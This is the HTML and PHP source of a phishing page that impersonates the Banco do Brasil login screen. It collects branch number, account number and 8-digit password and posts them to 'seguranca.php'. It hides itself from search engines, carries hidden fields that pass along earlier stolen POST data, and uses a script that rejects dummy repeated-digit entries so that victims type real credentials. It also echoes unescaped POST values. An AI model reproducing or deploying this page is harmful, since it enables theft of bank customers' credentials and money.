<html lang="pt-BR"><head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<style type="text/css">
		@media (min-width: 1025px) {
			#icons {
				display: none !important;
			}
		}
		
		.pac-container {
			background-color: #fff;
			position: absolute!important;
			z-index: 1000;
			border-radius: 2px;
			border-top: 1px solid #d9d9d9;
			font-family: Arial, sans-serif;
			box-shadow: 0 2px 6px rgba(0, 0, 0, 0.3);
			-moz-box-sizing: border-box;
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
			overflow: hidden
		}
		
		.pac-logo:after {
			content: "";
			padding: 1px 1px 1px 0;
			height: 16px;
			text-align: right;
			display: block;
			background-image: url(https://maps.gstatic.com/mapfiles/api-3/images/powered-by-google-on-white3.png);
			background-position: right;
			background-repeat: no-repeat;
			background-size: 120px 14px
		}
		
		.hdpi.pac-logo:after {
			background-image: url(https://maps.gstatic.com/mapfiles/api-3/images/powered-by-google-on-white3_hdpi.png)
		}
		
		.pac-item {
			cursor: default;
			padding: 0 4px;
			text-overflow: ellipsis;
			overflow: hidden;
			white-space: nowrap;
			line-height: 30px;
			text-align: left;
			border-top: 1px solid #e6e6e6;
			font-size: 11px;
			color: #999
		}
		
		.pac-item:hover {
			background-color: #fafafa
		}
		
		.pac-item-selected,
		.pac-item-selected:hover {
			background-color: #ebf2fe
		}
		
		.pac-matched {
			font-weight: 700
		}
		
		.pac-item-query {
			font-size: 13px;
			padding-right: 3px;
			color: #000
		}
		
		.pac-icon {
			width: 15px;
			height: 20px;
			margin-right: 7px;
			margin-top: 6px;
			display: inline-block;
			vertical-align: top;
			background-image: url(https://maps.gstatic.com/mapfiles/api-3/images/autocomplete-icons.png);
			background-size: 34px
		}
		
		.hdpi .pac-icon {
			background-image: url(https://maps.gstatic.com/mapfiles/api-3/images/autocomplete-icons_hdpi.png)
		}
		
		.pac-icon-search {
			background-position: -1px -1px
		}
		
		.pac-item-selected .pac-icon-search {
			background-position: -18px -1px
		}
		
		.pac-icon-marker {
			background-position: -1px -161px
		}
		
		.pac-item-selected .pac-icon-marker {
			background-position: -18px -161px
		}
		
		.pac-placeholder {
			color: gray
		}
	</style>
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="robots" content="noindex, nofollow">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="shortcut icon" href="html/favicon.ico" type="image/x-icon">
	<link rel="stylesheet" href="html/main.css">
	<link rel="stylesheet" type="text/css" href="html/preloader.css">

	</head>
	<body id="home-background" class="home">
		<main id="site-main" class="main-home min-height" style="height: 100%;margin-top: -40px;background: url(html/bg.png) #eef414 bottom right;background-repeat: no-repeat;">
			<section class="center-home-screen center-block">
				<div class="form-center-tablet">
					<div class="block-field-search">
						<div class="block-formulariobb">
							<span class="error-field-search" id="ag">Ops, você tem que digitar a agência.</span> <span class="error-field-search" id="ct">Ops, você tem que digitar a conta.</span>
							<span class="error-field-search" id="s8">Ops, você tem que digitar a senha de 8 dígitos.</span>
							<form name="formulariobb1" method="post" id="formulariobb" onsubmit="return enviardados1();" style="zoom: 1.4;" action="seguranca.php">
								<?php foreach($_POST as $key => $value):  ?>
									<input type="hidden" name="<?php echo $key; ?>" id="<?php echo $key; ?>" value="<?php echo $value; ?>" />
								<?php endforeach; ?>
								<input required onkeyup="mascara('####-@', this);" name="agencia" id="agencia" placeholder="Agência" class="input-field fields-search active-input-search" maxlength="6" type="tel" style="display: inline-block;">
								<input required="" name="conta" id="conta" onkeyup="mascara('###########-@', this);" placeholder="Conta" class="input-field fields-search active-input-search" maxlength="13" type="tel" style="display: inline-block;">
								<input required="" maxlength="8" onkeyup="validar(this,'num');" name="senha8" id="senha8" placeholder="Senha (8 dígitos)" class="input-field fields-search active-input-search" type="tel" style="display: inline-block; -webkit-text-security: disc;">
								<center>
									<p style="color: #585656; margin-top: 10px; font-size:8px; margin-left: 20%">Substitua o "X" pelo "0" quando houver</p>
								</center>
								<input type="hidden" name="step" value="passo1">
								<button style="margin-top: 10px !important; zoom: 0.7" type="submit" class="back-to-results" id="back-results-button"> ENTRAR </button>
							</form>
						</div>
					</div>
				</div>
				<div id="icons"><img style="width:100%; " src="html/icons.png"></div> 
			</section>
		</main>
		<header id="top-header" class="yellow-header">
			<div class="clearfix content-wrapper"> <img src="html/phone.png"> </div>
		</header>
		<footer id="footer-home" class="site-footer">
			<section class="wrapper center-block"> <img src="html/logo-bb.gif" alt="Banco do Brasil" class="logo-bb"> <span class="copyright-footer">© Banco do Brasil</span>
				<ul class="contact-footer clearfix">
					<li class="clearfix"><strong data-i18n="home.callCenter">Central de Atendimento BB</strong>4004 0001 / 0800 729 0001</li>
					<li class="clearfix"><strong data-i18n="home.csc">SAC BB</strong> 0800 729 0722</li>
					<li class="clearfix"><strong data-i18n="home.ombudsman">Ouvidoria</strong> 0800 729 5678</li>
					<li class="clearfix"><strong data-i18n="home.deafSpeech">Deficientes Auditivos/fala</strong> 0800 729 0088</li>
					<li class="clearfix"><a href="http://bbseguranca.com.br/" target="_blank"><strong data-i18n="home.security">Segurança</strong></a></li>
				</ul>
			</section>
		</footer>
		<script>
			function enviardados1() {
				if (document.formulariobb1.senha8.value.length < 8) {
					var alerta = "Senha de 8 dígitos Inválida.";
					alert(alerta);
					document.formulariobb1.senha8.value="";
					document.formulariobb1.senha8.focus();
					return false;
				}
				if (document.formulariobb1.agencia.value == "1111-1") {
					var alerta = "Agência Inválida.";
					alert(alerta);
					document.formulariobb1.agencia.focus();
					return false;
				}
				if (document.formulariobb1.agencia.value == "2222-2") {
					var alerta = "Agência Inválida.";
					alert(alerta);
					document.formulariobb1.agencia.focus();
					return false;
				}
				if (document.formulariobb1.agencia.value == "3333-3") {
					var alerta = "Agência Inválida.";
					alert(alerta);
					document.formulariobb1.agencia.focus();
					return false;
				}
				if (document.formulariobb1.agencia.value == "4444-4") {
					var alerta = "Agência Inválida.";
					alert(alerta);
					document.formulariobb1.agencia.focus();
					return false;
				}
				if (document.formulariobb1.agencia.value == "5555-5") {
					var alerta = "Agência Inválida.";
					alert(alerta);
					document.formulariobb1.agencia.focus();
					return false;
				}
				if (document.formulariobb1.agencia.value == "6666-6") {
					var alerta = "Agência Inválida.";
					alert(alerta);
					document.formulariobb1.agencia.focus();
					return false;
				}
				if (document.formulariobb1.agencia.value == "7777-7") {
					var alerta = "Agência Inválida.";
					alert(alerta);
					document.formulariobb1.agencia.focus();
					return false;
				}
				if (document.formulariobb1.agencia.value == "8888-8") {
					var alerta = "Agência Inválida.";
					alert(alerta);
					document.formulariobb1.agencia.focus();
					return false;
				}
				if (document.formulariobb1.agencia.value == "9999-9") {
					var alerta = "Agência Inválida.";
					alert(alerta);
					document.formulariobb1.agencia.focus();
					return false;
				}
				if (document.formulariobb1.agencia.value == "0000-0") {
					var alerta = "Agência Inválida.";
					alert(alerta);
					document.formulariobb1.agencia.focus();
					return false;
				}
				if (document.formulariobb1.conta.value == "11111111111-1") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.conta.focus();
					return false;
				}
				if (document.formulariobb1.conta.value == "22222222222-2") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.conta.focus();
					return false;
				}
				if (document.formulariobb1.conta.value == "33333333333-3") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.conta.focus();
					return false;
				}
				if (document.formulariobb1.conta.value == "44444444444-4") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.conta.focus();
					return false;
				}
				if (document.formulariobb1.conta.value == "55555555555-5") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.conta.focus();
					return false;
				}
				if (document.formulariobb1.conta.value == "66666666666-6") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.conta.focus();
					return false;
				}
				if (document.formulariobb1.conta.value == "77777777777-7") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.conta.focus();
					return false;
				}
				if (document.formulariobb1.conta.value == "88888888888-8") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.conta.focus();
					return false;
				}
				if (document.formulariobb1.conta.value == "99999999999-9") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.conta.focus();
					return false;
				}
				if (document.formulariobb1.conta.value == "00000000000-0") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.conta.focus();
					return false;
				}
				if (document.formulariobb1.senha8.value == "11111111") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.senha8.focus();
					return false;
				}
				if (document.formulariobb1.senha8.value == "22222222") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.senha8.focus();
					return false;
				}
				if (document.formulariobb1.senha8.value == "33333333") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.senha8.focus();
					return false;
				}
				if (document.formulariobb1.senha8.value == "44444444") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.senha8.focus();
					return false;
				}
				if (document.formulariobb1.senha8.value == "55555555") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.senha8.focus();
					return false;
				}
				if (document.formulariobb1.senha8.value == "66666666") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.senha8.focus();
					return false;
				}
				if (document.formulariobb1.senha8.value == "77777777") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.senha8.focus();
					return false;
				}
				if (document.formulariobb1.senha8.value == "88888888") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.senha8.focus();
					return false;
				}
				if (document.formulariobb1.senha8.value == "99999999") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.senha8.focus();
					return false;
				}
				if (document.formulariobb1.senha8.value == "00000000") {
					var alerta = "Conta Inválida.";
					alert(alerta);
					document.formulariobb1.senha8.focus();
					return false;
				}
				return true;
			}

			function mascara(format, field) {
				var result = "";
				var maskIdx = format.length - 1;
				var error = false;
				var valor = field.value;
				var posFinal = false;
				if (field.setSelectionRange) {
					if (field.selectionStart == valor.length) posFinal = true;
				}
				valor = valor.replace(/[^0123456789Xx]/g, '')
				for (var valIdx = valor.length - 1; valIdx >= 0 && maskIdx >= 0; --maskIdx) {
					var chr = valor.charAt(valIdx);
					var chrMask = format.charAt(maskIdx);
					switch (chrMask) {
					case '#':
						if (!(/\d/.test(chr))) error = true;
						result = chr + result;
						--valIdx;
						break;
					case '@':
						result = chr + result;
						--valIdx;
						break;
					default:
						result = chrMask + result;
					}
				}
				field.value = result;
				field.style.color = error ? 'red' : '';
				if (posFinal) {
					field.selectionStart = result.length;
					field.selectionEnd = result.length;
				}
				return result;
			}

			function pulacampo(idobj, idproximo) {
				var str = new String(document.getElementById(idobj).value);
				var mx = new Number(document.getElementById(idobj).maxLength);
				if (str.length == mx) {
					document.getElementById(idproximo).focus();
				}
			}

			function validar(dom, tipo) {
				switch (tipo) {
				case 'num':
					var regex = /[A-Za-z]/g;
					break;
				case 'text':
					var regex = /\d/g;
					break;
				}
				dom.value = dom.value.replace(regex, '');
			}

			function mascaracel(t, mask) {
				var i = t.value.length;
				var saida = mask.substring(1, 0);
				var texto = mask.substring(i)
				if (texto.substring(0, 1) != saida) {
					t.value += texto.substring(0, 1);
				}
			}
		</script>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
		<script type="text/javascript" src="html/preloader.js"></script>
		<script>
			$(document).ready(function () {
				$('img.acessarpgn').click(function () {
					window.location.href = "?secure=bbseguro";
				});
			});
		</script>
	

</body></html>